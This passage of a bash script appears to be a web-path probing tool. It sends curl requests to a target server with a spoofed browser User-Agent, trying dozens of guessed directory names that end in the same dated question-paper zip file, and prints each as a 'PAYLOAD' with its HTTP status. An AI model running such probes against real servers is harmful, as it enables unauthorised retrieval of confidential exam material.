" "${target}ModuleQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_BulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_BulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileHandling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileHandling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
